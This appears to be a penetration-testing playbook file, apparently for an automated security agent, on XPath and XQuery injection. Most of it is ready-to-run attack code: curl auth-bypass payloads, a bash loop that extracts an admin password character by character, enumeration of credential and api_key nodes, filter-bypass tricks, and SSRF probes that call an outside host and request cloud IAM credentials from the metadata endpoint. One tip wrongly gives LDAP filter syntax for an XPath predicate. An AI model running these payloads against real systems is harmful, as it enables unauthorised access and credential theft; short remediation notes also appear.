---
name: xpath-injection
description: XPath / XQuery injection — XML document enumeration, auth bypass via predicate rewriting
triggers: [xpath, xquery, xpath injection, xml database, exist-db, sedna, basex, marklogic]
---

# XPath Injection

XPath is the SQL of XML. When an application builds an XPath expression by concatenating user input, the attacker rewrites the predicate to bypass auth (`' or '1'='1`), enumerate the XML document (string-based extraction), or read every node the app's user-context can reach. XQuery (a superset) adds full programmability + remote XML fetch (XXE-adjacent).

CWE-643. Companion to `scan_xpath_injection`.

## Attack Surface

**Where XPath lives in modern apps**
- Legacy Java apps querying XML config files (`document.xml`, `users.xml`)
- XML databases: eXist-db, Sedna, BaseX, MarkLogic, Tamino
- SOAP services with XPath-based filtering
- Apps using XPath for "easy" XML-backed authentication (`/users/user[username='X' and password='Y']`)
- Spring Web Flow / older Java enterprise apps with XML state stores
- Document-storage apps that index/query XML metadata
- Test-data files used as embedded directories in microservices

**XPath 1.0 vs 2.0 / XQuery**
- XPath 1.0: predicate rewriting, no string functions beyond `substring()` / `contains()` / `position()` / `count()`
- XPath 2.0 / 3.0: regex, full string lib, conditional expressions
- XQuery: turing-complete, can `fn:doc()` external URLs (XXE-style SSRF), `fn:put()` (write), `fn:trace()` (info leak)

## XPath Syntax (need-to-know)

```xpath
/users/user[username='alice' and password='secret']        # absolute, predicate
//user[name()='admin']                                      # any path
/users/user[1]                                              # positional
/users/user[contains(name, 'adm')]                          # function-based
//*[node-name()='secret']                                   # wildcard
count(//user)                                               # total count
substring((/users/user[1]/password), 1, 1)                  # 1-char extract
```

Injection works by closing the current predicate and opening one that's always-true.

## Detection Channels

### Auth-bypass probe (classic)

```bash
# Login form expects user + pass; XPath: /users/user[username='$U' and password='$P']
curl -X POST 'https://<TARGET>/login' \
  --data-urlencode "username=' or '1'='1" \
  --data-urlencode "password=anything"

# Or the one-liner that works on most templates:
curl -X POST 'https://<TARGET>/login' \
  --data-urlencode "username=admin' or 'a'='a" \
  --data-urlencode "password=x"
```

The resulting XPath becomes:
```
/users/user[username='admin' or 'a'='a' and password='x']
```
The `or 'a'='a'` short-circuits; the bind succeeds.

### Error-based fingerprint

```bash
# Trigger an XPath syntax error to identify the backend
PROBES=( "'" "')" "'(invalid" "/[%00]" )
for p in "${PROBES[@]}"; do
  echo "Probe: $p"
  curl -s -X POST 'https://<TARGET>/login' --data-urlencode "username=$p" | head -10
done
```

Error signatures:
- Java: `javax.xml.xpath.XPathExpressionException`, `org.jaxen.JaxenException`
- .NET: `System.Xml.XPath.XPathException`
- PHP DOM: `simplexml_load_string` warning, `xpath` returned false
- Python lxml: `lxml.etree.XPathEvalError`

### Boolean-blind extraction

```bash
# Probe one bit of the admin password
curl -X POST 'https://<TARGET>/login' \
  --data-urlencode "username=admin' and substring(password,1,1)='a' or 'a'='" \
  --data-urlencode "password=x"

# If response differs from baseline → 1st char is 'a'. Iterate the alphabet, then position 2, etc.
```

### Numeric blind (count() oracle)

```bash
# How many user nodes exist?
curl -X POST 'https://<TARGET>/login' \
  --data-urlencode "username=' or count(/users/user)=5 or 'a'='" \
  --data-urlencode "password=x"
# Different response based on whether count equals 5; binary search for the actual count.
```

### XQuery doc()/put() probes

```bash
# When the backend is XQuery-capable, fn:doc() can fetch external URLs (SSRF)
curl 'https://<TARGET>/search?q=]/text()|//doc("http://oast.fun/xq-probe")//'

# Hits oast.fun confirms XQuery + outbound fetch enabled.
```

## Operational Runbook

### Step 1 — fingerprint the XML backend

```bash
# Error probes
ERROR_RESPONSE=$(curl -s -X POST 'https://<TARGET>/login' \
  --data-urlencode "username='" --data-urlencode "password=x")

echo "$ERROR_RESPONSE" | grep -iE 'XPath|XQuery|jaxen|saxon|xerces'
```

### Step 2 — confirm injection via auth bypass

```bash
PAYLOADS=(
  "admin' or '1'='1"
  "' or 1=1 or ''='"
  "' or count(/)>0 or ''='"
  "x'] | //user[1] | //fake['"
  "admin' or position()=1 or 'a'='a"
)

for p in "${PAYLOADS[@]}"; do
  RESP=$(curl -s -i -X POST 'https://<TARGET>/login' \
    --data-urlencode "username=$p" \
    --data-urlencode "password=anything")
  if echo "$RESP" | grep -qiE 'set-cookie.*session|"token":'; then
    echo "BYPASS WORKS: $p"
    break
  fi
done
```

### Step 3 — extract sensitive node text (blind)

```bash
# Extract admin password char-by-char
EXTRACTED=""
for pos in {1..50}; do
  found=""
  for c in {a..z} {A..Z} {0..9} '!' '@' '#' '$' '%' '&' '*' '.' '-' '_'; do
    PAYLOAD="' or substring(/users/user[username='admin']/password, ${pos}, 1)='${c}' or 'a'='"
    RESP_SIZE=$(curl -s -X POST 'https://<TARGET>/login' \
      --data-urlencode "username=$PAYLOAD" \
      --data-urlencode "password=x" \
      -o /dev/null -w '%{size_download}')
    if [[ "$RESP_SIZE" -gt "$BASELINE" ]]; then
      EXTRACTED="${EXTRACTED}${c}"
      found="y"
      break
    fi
  done
  [[ -z "$found" ]] && break
done
echo "Extracted: $EXTRACTED"
```

### Step 4 — node enumeration

```bash
# Find which top-level nodes exist
for nodename in user admin secret config session credential api_key; do
  PAYLOAD="' or count(//${nodename})>0 or ''='"
  RESP=$(curl -s -X POST 'https://<TARGET>/login' \
    --data-urlencode "username=$PAYLOAD" \
    --data-urlencode "password=x")
  # Compare to baseline; different shape → that node exists
done
```

### Step 5 — XQuery SSRF (when applicable)

```bash
# Fire SSRF via fn:doc()
curl "https://<TARGET>/search?q=' | fn:doc('http://169.254.169.254/latest/meta-data/iam/security-credentials/')//* | x['"
```

When the backend is BaseX / MarkLogic / eXist with XQuery enabled, `fn:doc()` can reach internal services — full SSRF capability.

## Bypass Techniques

- **Quote variations**: `"` vs `'` — try the opposite quote when one is filtered.
- **String concatenation**: `concat('a', 'b')` instead of `'ab'` — bypass character-class filters.
- **Encoded apostrophe**: `&apos;` in XML contexts, `%27` in URL, `\x27` in JSON-escaped contexts.
- **XPath 2.0 functions**: when 1.0 is filtered, 2.0's `matches()` / `replace()` give more bypass surface.
- **Comment injection** (XPath 3.0 only): `(: comment :)` to break expression mid-flow.
- **Type coercion**: numeric context — `1 div 0` triggers a specific error that fingerprints the engine.

## Validation

1. Auth bypass: capture a session cookie / JWT obtained without a valid password.
2. Blind extraction: extract a verifiable non-public string (a known admin's email or partial-known password) one char at a time.
3. Document the exact predicate that allowed bypass and the inferred app-side XPath expression.
4. For XQuery SSRF: OAST confirmation of `fn:doc('http://oast.fun/xq')`.

## False Positives

- App uses **XPath parameter binding** (`XPath.compile(...).setVariable(...)` in Java) — no string concat; no injection.
- App-side validation strips quotes / brackets before building the XPath — confirm via probe.
- Generic 500 errors from XML parsing failures unrelated to the injected predicate.
- App switched to JSON / JSONPath but still accepts XML — XPath errors confused with JSON parse errors.

## Impact

- Auth bypass — most common XPath finding.
- Mass document exfil — read every node the app's context can access.
- XQuery SSRF — pivot to cloud metadata + internal services.
- Privilege escalation when the XML doc stores role / group memberships.
- Persistent compromise on XQuery-write capable backends (`fn:put()`).

## Remediation

1. **Use parameterised XPath**: Java's `XPath.compile(...).setVariable(...)`, .NET's `XPathExpression` with variables, lxml's `etree.XPath(..., namespaces={})`. Never string-concat.
2. **Validate input shape** at the app layer before XPath construction (whitelist character classes).
3. **Disable external entity / external doc references** in the XML parser (also closes XXE).
4. **Disable XQuery `fn:doc()` / `fn:put()` / `fn:trace()`** at the backend; whitelist allowed function calls.
5. **Migrate XML-backed auth to a proper database** — XPath-based auth on `users.xml` was acceptable in 2005, not 2026.

## Pro Tips

1. The classic `' or '1'='1` works on a surprising number of legacy Java / .NET apps still in production.
2. When the app returns "no user found" for a wrong username and "wrong password" for a wrong password, the predicate is `(&(...)(...))` — split the conditions in two boolean probes.
3. XML-database apps (eXist, BaseX) often expose REST endpoints that take raw XQuery — those are server-side eval = RCE-equivalent.
4. SOAP services often have XPath filtering on the back-end; the SOAP body is a great injection vector.
5. The fingerprint matters: XPath 1.0 has no `matches()` / regex; trying a regex predicate fails differently on 1.0 vs 2.0 vs 3.0 backends.

## Summary

XPath injection is SQLi for XML documents. Auth bypass via `or '1'='1` is the canonical exploit; blind extraction via `substring()` builds out the document. Migrate XPath-backed auth to a real DB; parameterise everything else.
